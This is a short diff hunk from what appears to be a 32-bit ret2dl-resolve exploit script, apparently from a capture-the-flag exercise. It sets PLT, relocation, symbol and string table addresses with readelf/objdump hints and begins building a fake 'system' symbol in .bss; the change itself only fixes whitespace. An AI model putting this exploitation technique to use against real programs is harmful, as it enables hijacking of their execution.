@@ -34,7 +34,7 @@ plt_0 = 0x08048380	#objdump <filename> -d -j .plt
 r_info = 0x107	#readelf -r <filename>
 rel_plt = 0x0804833c #objdump <filename> -s -j .rel.plt,addr of the .rel.plt start 
 dynsym =  0x080481dc	#readelf -d <filename>,SYMTAB
-dynstr = 0x0804827c		#readelf -d <filename>,STRTAB
+dynstr = 0x0804827c	#readelf -d <filename>,STRTAB
 
 fake_sys_addr = bss + 36
 align = 0x10 - ((fake_sys_addr-dynsym)&0xf)
